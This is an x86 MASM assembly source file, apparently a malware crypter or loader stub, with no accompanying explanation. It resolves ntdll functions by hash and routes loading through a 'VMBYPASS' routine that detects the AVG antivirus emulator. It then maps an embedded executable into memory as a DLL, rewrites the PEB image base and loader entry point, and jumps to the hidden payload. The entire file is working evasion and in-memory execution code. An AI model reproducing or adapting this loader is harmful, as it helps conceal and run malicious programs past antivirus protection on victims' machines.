	.686
	.model flat, stdcall
	option casemap :none
	
	include \masm32\include\ntdll.inc
	includelib \masm32\lib\ntdll.lib

.data
	include Map.inc

.code
$Exe	CHAR "stored_exe.exe",0

%NTERR macro
	.if Eax
		Int 3
	.endif
endm

.code
Tc proc Arg:PVOID, Ip:PVOID, State:PVOID
	mov ecx,Ip
	xor eax,eax
	.if W[Ecx] == 0BBF0H	; AVG VM CALL
		inc eax
	.endif
	ret
Tc endp

LoadDll proto MapToLoad:PVOID, PeName:PSTR, Handle:PHANDLE
LdrEncodeEntriesList proto Handle:HANDLE, ApiList:PVOID

Buffer	BYTE 32 DUP (?)	; 16, MAX_IP_LENGTH

VMBYPASS proto BufferRWE:PVOID, Ip:PVOID, Clbk:PVOID, ClbkArg:PVOID, ArgN:ULONG, Args:PVOID

EP proc
Local NtHeader:PIMAGE_NT_HEADERS
Local Handle:HANDLE
Local Ldr:PLDR_DATA_TABLE_ENTRY
Local Api[4]:PVOID

	mov Api[0],5464CDD3H	; RtlImageNtHeader()
	mov Api[4],37F9501DH	; LdrFindEntryForAddress()
	mov Api[2*4],0FB1B025BH	; LdrDisableThreadCalloutsForDll()
	mov Api[3*4],NULL	; EOL
	invoke LdrEncodeEntriesList, NULL, addr Api
	%NTERR

; Disable EP().
	push offset Map
	Call Api[0]
	xor esi,esi
	mov ebx,eax
	assume ebx:PIMAGE_NT_HEADERS
	xchg [ebx].OptionalHeader.AddressOfEntryPoint,esi	; Esi: RVA EP

; FIX LdrpWalkImportDescriptor().
	or [ebx].FileHeader.Characteristics,IMAGE_FILE_DLL

	lea eax,Handle
	push eax
	push offset $Exe
	push offset Map
	
	push esp	; Arg's
	push 3	; Arg num.
	push 0	; Callback arg.
	push offset Tc
	push offset LoadDll
	push offset Buffer
	Call VMBYPASS
	pop ecx
	%NTERR
	
	push Handle
	Call Api[2*4]
	%NTERR
	
; FIX GMDH(NULL).
	assume fs:nothing
	mov eax,Handle
	mov ecx,fs:[TEB.Peb]
	add esi,Handle	; EP
	mov PEB.ImageBaseAddress[ecx],eax

; FIX LDR.EP
	lea edx,Ldr
	push edx
	push esi
	Call Api[4]
	mov ecx,Ldr
	%NTERR
	mov LDR_DATA_TABLE_ENTRY.EntryPoint[ecx],esi
	
	Call Esi	; EP()
	ret
EP endp
end EP